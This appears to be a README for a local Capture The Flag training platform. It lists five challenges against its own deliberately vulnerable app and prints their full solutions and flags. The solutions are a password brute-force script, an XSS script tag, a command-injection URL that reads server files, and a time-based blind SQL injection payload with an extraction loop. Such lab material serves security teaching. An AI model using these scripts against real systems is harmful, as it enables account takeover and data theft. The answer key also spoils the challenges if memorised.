# 🕵️‍♂️ CTF Challenge Platform

This is a **Capture The Flag (CTF) challenge platform** designed to test participants' cybersecurity skills. The platform consists of various security challenges, including **Brute Force, XSS, CSRF, Command Execution, and Time-Based Blind SQL Injection**.

The challenges simulate real-world vulnerabilities, providing a hands-on learning experience for security enthusiasts.


---

## 🚀 Getting Started

### **Prerequisites**
Make sure you have the following installed:

- [Docker](https://www.docker.com/)
- [Node.js](https://nodejs.org/)

---

## 🔥 **Run the CTF Challenge Locally**

This project uses **Docker Compose** to set up the **application and database**. Follow these steps to get started:

### **Clone the Repository**
```
git clone https://github.com/fatin-farhan/Capture-The-Flag.git
cd Capture-The-Flag
```

### **Start the Application with Docker**
Run the following command to start the containers:

```
docker-compose up --build -d
```
This will:

Launch the CTF application.


### **Access the Application**
Once everything is set up, open your browser and visit:

```
http://localhost:3000
```

### **📖 CTF Challenge Overview**
The platform includes multiple challenges, each simulating a different attack vector:

### **🛠️ Challenge 1: Brute Force**
Use a 100,000 most common passwords list to brute-force the login.
```
import requests
username='admin'
passwordList = []

with open('100000-most-common-passwords.txt', 'r') as inputFile:
    for eachLine in inputFile:
        passwordList.append(eachLine.strip())

for i in range(len(passwordList)):
    password=passwordList[i]
    credentials = {'username': username,'password': password}
    response = requests.post('http://localhost:3000/ctf1/login', data=credentials)
    if response.status_code == 200:
        print(credentials)
        break 
```
Username: admin
Password: forever1
Hint: After login, check the cookies for a Base64-encoded flag.
Flag: Flag{baby_step_hacker}

### **💀 Challenge 2: XSS (Cross-Site Scripting)**

Hidden hint in the source code suggests a POST request to /api/admin/dashboard.

```
<script>
fetch('ctf2/api/admin/dashboard', 
{method:'POST'})
.then(res => res.json())
.then(console.log);
</script>
```

Submitting a POST request through the comment section reveals the flag.
Flag: Flag{XSS_S3RV3R_S1D3_D4T4_L34K}

### **🎯 Challenge 3: CSRF (Cross-Site Request Forgery)**
Embedded iframe on the attacker's website (http://localhost:3000/attacker) loads a vulnerable URL.

Correct URL: http://localhost:3000/ctf3/login

Login and quickly visit http://localhost:3000/attacker to steal the session and retrieve the flag.

Flag: Flag{CPTS580}

### **📡 Challenge 4: Command Execution**
After login, inspect cookies to find a hidden path: /upload.

Upload an image containing a Bash script to gain remote code execution.
```#!/bin/bash```
Base64 encoded URL reveals /the-fourth-flag.

Visiting http://localhost:3000/ctf4/the-fourth-flag?exec=ls lists server files.

Run: http://localhost:3000/ctf4/the-fourth-flag?exec=cat%20flag4.txt to read the flag.

Flag: Flag{You_Are_Cool}

### **⏱️ Challenge 5: Time-Based Blind SQL Injection**
Vulnerable API login endpoint at /api/login.

SQL injection to introduce time delay and extract characters.

Use the payload:

```
'CASE SUBSTR(password,i,1) WHEN CHAR(j) THEN 123=LIKE ("ABCDEFG",UPPER(HEX(RANDOMBLOB(10000000/2)))) ELSE null END --'
Extract full password by iterating through characters.
```
```
import requests
import time
import string
url = "http://localhost:3000/ctf5/api/login"
password = ""
for i in range(1, 19): 
    for char in string.printable:
        payload = f'CASE SUBSTR(password,{i},1) WHEN CHAR({ord(char)}) THEN 123=LIKE("ABCDEFG",UPPER(HEX(RANDOMBLOB(10000000/2)))) ELSE null END --'
        credential = {"username": "admin", "password": payload}
        start = time.time()
        response = requests.post(url,credential)
        elapsed = time.time() - start
        if elapsed > 0.3:  
            password += char
            print(f"Found: {password}")
            break
print(f"Extracted Password: {password}")
```
Flag: Flag{You_Are_A_Pro}

### **🛠️ Development & Debugging**
For development mode (without Docker), run:

```
npm install
npm start
```
This will start the development server at http://localhost:3000.


### **🐳 Docker Management Commands **
✅ Stop Containers
To stop the running containers:

```docker-compose down```
### **✅ Rebuild and Restart Containers**
To rebuild and restart containers after code changes:

```docker-compose up --build -d```
### **✅ View Logs**
To view application logs:

```docker-compose logs -f```
### **✅ Check Running Containers**
To list running containers:

```docker ps```
### **🚀 Deployment***
Build and Run Docker Containers
To deploy the application, build and run the Docker images:

```docker-compose up --build -d```
Stop Running Containers
To stop the running containers:

```docker-compose down```



### **🤝 Contributors**
Md Tasnim Farhan Fatin

Tamim Ahmed

‪Mohammad Fakhruddin Babar





